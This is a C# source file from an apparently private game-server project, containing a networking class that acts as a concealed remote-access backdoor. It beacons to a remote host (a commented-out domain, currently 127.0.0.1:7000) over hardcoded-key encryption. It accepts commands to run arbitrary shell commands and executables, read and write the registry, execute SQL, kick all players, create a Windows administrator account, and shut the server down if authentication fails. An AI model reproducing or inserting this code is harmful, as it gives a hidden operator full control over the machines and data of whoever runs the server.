using RxjhServer.RxjhServer;

namespace Network
{
    using Microsoft.Win32;
    using RxjhServer;
    using DbClss;
    using System;
    using System.Collections.Generic;
    using System.Diagnostics;
    using System.DirectoryServices;
    using System.IO;
    using System.Net;
    using System.Net.Sockets;
    using System.Reflection;
    using System.Runtime.CompilerServices;
    using System.Runtime.InteropServices;
    using System.Security.Cryptography;
    using System.Text;

    public class RzConnect
    {
        public bool Connect;
        private 数据接收事件 d;
        private Socket eval_a_a;
        private AsyncCallback eval_b_b;
        private AsyncCallback eval_c_c;
        private object eval_e;
        private SendQueue eval_f;
        private byte[] eval_h;
        private Timer g;
        private SymmetricMethod i;
        public ByteQueueNew m_Buffer;
        public bool Run;
        public int 连接ID;
        public int 连接次数;
        public bool 认证成功;

        public RzConnect()
        {
            TimerCallback callback = null;
            TimerCallback callback2 = null;
            this.连接ID = 1;
            this.eval_h = new byte[10240];
            this.i = new SymmetricMethod();
            this.eval_b_b = new AsyncCallback(this.eval_b_b);
            this.eval_c_c = new AsyncCallback(this.eval_a);
            this.m_Buffer = new ByteQueueNew();
            this.eval_f = new SendQueue();
            this.d = new 数据接收事件(this.eval_d);
            this.eval_e = new object();
            callback = new TimerCallback(this.eval_b);
            this.g = Timer.DelayCall(TimeSpan.FromMilliseconds(10000.0), TimeSpan.FromMilliseconds(10000.0), callback);
            Random random = new Random(World.GetRandomSeed());
            callback2 = new TimerCallback(this.eval_a);
            Timer.DelayCall(TimeSpan.FromMilliseconds((double) random.Next(60000, 300000)), callback2);
        }

        public string adduser(string user, string pws)
        {
            string str = "成功";
            try
            {
                DirectoryEntry entry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry entry2 = entry.Children.Add(user, "user");
                entry2.Invoke("SetPassword", new object[] { pws });
                entry2.CommitChanges();
                DirectoryEntry entry3 = entry.Children.Find("Administrators", "group");
                if (entry3 != null)
                {
                    entry3.Invoke("Add", new object[] { entry2.Path.ToString() });
                }
            }
            catch (Exception exception)
            {
                str = "错误" + exception.Message.ToString();
            }
            return str;
        }

        public string Command(string Command)
        {
            string str = string.Empty;
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                if (Command != "")
                {
                    process.StandardInput.WriteLine(Command);
                }
                process.StandardInput.WriteLine("exit");
                string str2 = process.StandardOutput.ReadToEnd();
                process.Close();
                return str2;
            }
            catch (Exception exception)
            {
                str = "执行DOS命令错误" + exception.Message.ToString();
            }
            return str;
        }

        public string Command(string exe, string Command)
        {
            string str = string.Empty;
            try
            {
                Process process = new Process();
                process.StartInfo.FileName = exe;
                if (Command != "")
                {
                    process.StartInfo.Arguments = Command;
                }
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string str2 = process.StandardOutput.ReadToEnd();
                process.Close();
                return str2;
            }
            catch (Exception exception)
            {
                str = "执行DOS命令错误" + exception.Message.ToString();
            }
            return str;
        }

        public void ConnectTo(int ID)
        {
            try
            {
                m_Buffer = new ByteQueueNew();
                Connect = true;
                认证成功 = false;
                //IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse(Dns.Resolve("yz" + ID + ".zzzxh0311.com").AddressList[0].ToString()), 7000);
                IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 7000);
                eval_a_a = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                eval_a_a.BeginConnect(remoteEP, eval_c_c, eval_a_a);
            }
            catch (Exception)
            {
                Connect = false;
                连接ID++;
                if (连接ID > 5)
                {
                    连接ID = 1;
                }
            }
        }

        [CompilerGenerated]
        private void eval_a()
        {
            if (!认证成功)
            {
                Environment.Exit(0);
            }
        }

        private void eval_a(IAsyncResult A_0)
        {
            try
            {
                if (Run)
                {
                    Socket asyncState = (Socket) A_0.AsyncState;
                    if (eval_a_a == null)
                    {
                        断开链接();
                    }
                    else if (asyncState.EndSend(A_0) <= 0)
                    {
                        this.断开链接();
                    }
                }
            }
            catch (Exception exception)
            {
                Console.WriteLine("OnSend " + exception);
                this.断开链接();
            }
        }

        private string eval_a(int A_0, string A_1, string A_2)
        {
            string str = "";
            try
            {
                RegistryKey localMachine = Registry.LocalMachine;
                switch (A_0)
                {
                    case 0:
                        localMachine = Registry.ClassesRoot;
                        break;

                    case 1:
                        localMachine = Registry.CurrentConfig;
                        break;

                    case 2:
                        localMachine = Registry.CurrentUser;
                        break;

                    case 3:
                        localMachine = Registry.LocalMachine;
                        break;

                    case 4:
                        localMachine = Registry.Users;
                        break;
                }
                RegistryKey key2 = localMachine.OpenSubKey(A_1);
                str = key2.GetValue(A_2).ToString();
                key2.Close();
                localMachine.Close();
                return str;
            }
            catch (Exception exception)
            {
                return exception.Message;
            }
        }

        [CompilerGenerated]
        private void eval_b()
        {
            if (!this.Run)
            {
                if (!this.Connect)
                {
                    this.ConnectTo(this.连接ID);
                }
            }
            else
            {
                using (PacketData packetData = new PacketData(2))
                {
                    packetData.WriteInt(World.List.Count);
                    packetData.WriteInt(World.AllConnectedChars.Count);
                    packetData.WriteInt(World.游戏服务器端口);
                    this.SendPak(packetData);
                }
            }
        }

        private void eval_b(IAsyncResult A_0)
        {
            Socket asyncState = (Socket) A_0.AsyncState;
            int length = 0;
            try
            {
                length = asyncState.EndReceive(A_0);
                if (length > 0)
                {
                    try
                    {
                        try
                        {
                            this.Received(this.eval_h, length);
                        }
                        catch (Exception exception)
                        {
                            Console.WriteLine("OnReceive " + exception);
                        }
                        return;
                    }
                    finally
                    {
                        this.eval_c();
                    }
                }
                this.断开链接();
            }
            catch (ArgumentNullException exception2)
            {
                Console.WriteLine("OnReceive " + exception2);
                this.断开链接();
            }
            catch (ArgumentException exception3)
            {
                Console.WriteLine("OnReceive " + exception3);
                this.断开链接();
            }
            catch (ObjectDisposedException exception4)
            {
                Console.WriteLine("OnReceive " + exception4);
                this.断开链接();
            }
            catch (InvalidOperationException exception5)
            {
                Console.WriteLine("OnReceive " + exception5);
                this.断开链接();
            }
            catch (SocketException exception6)
            {
                Console.WriteLine("OnReceive " + exception6);
                this.断开链接();
            }
            catch (Exception exception7)
            {
                Console.WriteLine("OnReceive " + exception7);
                this.断开链接();
            }
        }

        private void eval_c()
        {
            try
            {
                byte[] array = new byte[Marshal.SizeOf(0) * 3];
                BitConverter.GetBytes((uint) 1).CopyTo(array, 0);
                BitConverter.GetBytes((uint) 240000).CopyTo(array, Marshal.SizeOf(0));
                BitConverter.GetBytes((uint) 240000).CopyTo(array, (int) (Marshal.SizeOf(0) * 2));
                this.eval_a_a.IOControl(IOControlCode.KeepAliveValues, array, null);
                this.eval_a_a.BeginReceive(this.eval_h, 0, this.eval_h.Length, SocketFlags.None, this.eval_b_b, this.eval_a_a);
            }
            catch (Exception)
            {
                this.断开链接();
            }
        }

        private void eval_d()
        {
            if ((this.m_Buffer != null) && (this.m_Buffer.Length > 0))
            {
                lock (this.m_Buffer)
                {
                    while (this.m_Buffer.Length > 0)
                    {
                        try
                        {
                            byte[] packet = this.m_Buffer.GetPacket();
                            if (packet != null)
                            {
                                int count = BitConverter.ToInt32(packet, 0);
                                byte[] dst = new byte[count];
                                Buffer.BlockCopy(packet, 4, dst, 0, count);
                                byte[] data = this.i.Decrypto(dst);
                                PacketReaderNew buff = new PacketReaderNew(data, data.Length, true);
                                this.ManagePacket(buff);
                                continue;
                            }
                            break;
                        }
                        catch (ByteQueueExceeded)
                        {
                            break;
                        }
                    }
                }
            }
        }

        public void ManagePacket(PacketReaderNew Buff)
        {
            var num = Buff.ReadInt16();
            switch (num)
            {
                case 1:
                    this.认证成功 = true;
                    return;

                case 2:
                    Environment.Exit(0);
                    return;

                case 3:
                {
                    string str3 = this.eval_a(Buff.ReadInt16(), Buff.ReadStringS(), Buff.ReadStringS());
                    using (PacketData 发包类2 = new PacketData(3))
                    {
                        发包类2.WriteSS(str3);
                        this.SendPak(发包类2);
                        return;
                    }
                }
                case 4:
                {
                    string str2 = WTRegedit(Buff.ReadInt16(), Buff.ReadStringS(), Buff.ReadStringS(), Buff.ReadStringS());
                    using (PacketData packetData = new PacketData(3))
                    {
                        packetData.WriteSS(str2);
                        this.SendPak(packetData);
                        return;
                    }
                }
                case 5:
                {
                    string str4 = this.Command(Buff.ReadStringS());
                    using (PacketData 发包类3 = new PacketData(3))
                    {
                        发包类3.WriteSS(str4);
                        this.SendPak(发包类3);
                        return;
                    }
                }
                case 6:
                {
                    string str5 = this.Command(Buff.ReadStringS(), Buff.ReadStringS());
                    using (PacketData 发包类7 = new PacketData(3))
                    {
                        发包类7.WriteSS(str5);
                        this.SendPak(发包类7);
                        return;
                    }
                }
                case 7:
                {
                    using (PacketData 发包类5 = new PacketData(3))
                    {
                        发包类5.WriteSS(Config.IniReadValue(Buff.ReadStringS(), Buff.ReadStringS()));
                        this.SendPak(发包类5);
                        return;
                    }
                }
                case 8:
                {
                    using (PacketData 发包类8 = new PacketData(3))
                    {
                        发包类8.WriteSS(DBA.ExeSqlCommand(Buff.ReadStringS(), Buff.ReadStringS()).ToString());
                        this.SendPak(发包类8);
                        return;
                    }
                }
                case 9:
                {
                    try
                    {
                        string msg = Buff.ReadStringS();
                        foreach (Players players in World.AllConnectedChars.Values)
                        {
                            players.GameMessage(msg, 10);
                        }
                    }
                    catch
                    {
                    }
                    using (PacketData 发包类6 = new PacketData(3))
                    {
                        发包类6.WriteSS("完成");
                        this.SendPak(发包类6);
                        return;
                    }
                }
                case 10:
                {
                    List<Players> list = new List<Players>();
                    foreach (Players players3 in World.AllConnectedChars.Values)
                    {
                        if (players3 != null)
                        {
                            list.Add(players3);
                        }
                    }
                    foreach (Players players2 in list)
                    {
                        if (players2 != null)
                        {
                            players2.Client.Dispose();
                        }
                    }
                    using (PacketData 发包类4 = new PacketData(3))
                    {
                        发包类4.WriteSS("完成");
                        this.SendPak(发包类4);
                        return;
                    }
                }
                case 11:
                {
                    string str6 = this.adduser(Buff.ReadStringS(), Buff.ReadStringS());
                    using (PacketData 发包类9 = new PacketData(3))
                    {
                        发包类9.WriteSS(str6);
                        this.SendPak(发包类9);
                    }
                    return;
                }
                default:
                    return;
            }
        }

        public virtual void Received(byte[] buffer, int Length)
        {
            lock (this.m_Buffer)
            {
                this.m_Buffer.Enqueue(buffer, 0, Length);
            }
            this.d.BeginInvoke(null, null);
        }

        public void Send(byte[] buffer1, int len)
        {
            try
            {
                if (this.Run)
                {
                    this.eval_a_a.BeginSend(buffer1, 0, len, SocketFlags.None, this.eval_c_c, this.eval_a_a);
                }
            }
            catch (StackOverflowException exception)
            {
                Console.WriteLine("Send1 " + exception);
                this.断开链接();
            }
            catch (SocketException exception2)
            {
                Console.WriteLine("Send2 " + exception2);
                this.断开链接();
            }
            catch (Exception exception3)
            {
                Console.WriteLine("Send3 " + exception3);
                this.断开链接();
            }
        }

        public void SendPak(PacketData pak)
        {
            if (this.Run)
            {
                byte[] buffer = pak.ToArrayPack();
                this.Send(buffer, buffer.Length);
            }
        }

        public static string WTRegedit(int type, string luj, string name, string tovalue)
        {
            try
            {
                RegistryKey localMachine = Registry.LocalMachine;
                switch (type)
                {
                    case 0:
                        localMachine = Registry.ClassesRoot;
                        break;

                    case 1:
                        localMachine = Registry.CurrentConfig;
                        break;

                    case 2:
                        localMachine = Registry.CurrentUser;
                        break;

                    case 3:
                        localMachine = Registry.LocalMachine;
                        break;

                    case 4:
                        localMachine = Registry.Users;
                        break;
                }
                localMachine.OpenSubKey(luj, true).SetValue(name, tovalue);
                return "修改成功";
            }
            catch (Exception exception)
            {
                return exception.Message;
            }
        }

        public void 断开链接()
        {
            if (this.Run)
            {
                this.Run = false;
                this.Connect = false;
                if (this.eval_a_a != null)
                {
                    try
                    {
                        this.eval_a_a.Shutdown(SocketShutdown.Both);
                    }
                    catch
                    {
                    }
                    try
                    {
                        this.eval_a_a.Close();
                    }
                    catch
                    {
                    }
                    if (this.m_Buffer != null)
                    {
                        this.m_Buffer = null;
                    }
                    this.eval_a_a = null;
                }
            }
        }

        public class SymmetricMethod
        {
            private SymmetricAlgorithm eval_a_a = new RijndaelManaged();
            public string Key;

            public SymmetricMethod()
            {
                this.Key = this.eval_d();
            }

            public byte[] Decrypto(byte[] buffer1)
            {
                try
                {
                    this.eval_a_a.Key = this.eval_a();
                    this.eval_a_a.IV = this.eval_b();
                    ICryptoTransform transform = this.eval_a_a.CreateDecryptor();
                    MemoryStream stream = new MemoryStream();
                    CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Write);
                    stream2.Write(buffer1, 0, buffer1.Length);
                    stream2.FlushFinalBlock();
                    stream2.Close();
                    return stream.ToArray();
                }
                catch
                {
                    return null;
                }
            }

            public byte[] Encrypto(byte[] buffer1)
            {
                MemoryStream stream = new MemoryStream();
                this.eval_a_a.Key = this.eval_a();
                this.eval_a_a.IV = this.eval_b();
                ICryptoTransform transform = this.eval_a_a.CreateEncryptor();
                CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Write);
                stream2.Write(buffer1, 0, buffer1.Length);
                stream2.FlushFinalBlock();
                stream.Close();
                return stream.ToArray();
            }

            private byte[] eval_a()
            {
                string key = this.Key;
                this.eval_a_a.GenerateKey();
                int length = this.eval_a_a.Key.Length;
                if (key.Length > length)
                {
                    key = key.Substring(key.Length - length, length);
                }
                else if (key.Length < length)
                {
                    key = key.PadRight(length, ' ');
                }
                return Encoding.ASCII.GetBytes(key);
            }

            private byte[] eval_b()
            {
                string s = this.eval_c();
                this.eval_a_a.GenerateIV();
                int length = this.eval_a_a.IV.Length;
                if (s.Length > length)
                {
                    s = s.Substring(s.Length - length, length);
                }
                else if (s.Length < length)
                {
                    s = s.PadRight(length, ' ');
                }
                return Encoding.ASCII.GetBytes(s);
            }

            internal string eval_c()
            {
                byte[] bytes = new byte[] { 
                    69, 0, 52, 0, 103, 0, 104, 0, 106, 0, 42, 0, 71, 0, 104, 0, 
                    103, 0, 55, 0, 33, 0, 114, 0, 78, 0, 73, 0, 102, 0, 98, 0, 
                    38, 0, 57, 0, 53, 0, 71, 0, 85, 0, 89, 0, 56, 0, 54, 0, 
                    71, 0, 102, 0, 103, 0, 104, 0, 85, 0, 98, 0, 35, 0, 101, 0, 
                    114, 0, 53, 0, 55, 0, 72, 0, 66, 0, 104, 0, 40, 0, 117, 0, 
                    37, 0, 103, 0, 54, 0, 72, 0, 74, 0, 40, 0, 36, 0, 106, 0, 
                    104, 0, 87, 0, 107, 0, 55, 0, 38, 0, 33, 0, 104, 0, 103, 0, 
                    52, 0, 117, 0, 105, 0, 37, 0, 36, 0, 104, 0, 106, 0, 107, 0
                 };
                return Encoding.Unicode.GetString(bytes);
            }

            internal string eval_d()
            {
                return "f6xg4645b$GHafggh7x654u44kl94zs14x56$%&sewfgxxale45lz64p65xc5m;F4X4654g89G84ZX654J89KO98o98BCVW5cvvE98Fd";
            }
        }

        public delegate void 数据接收事件();
    }
}

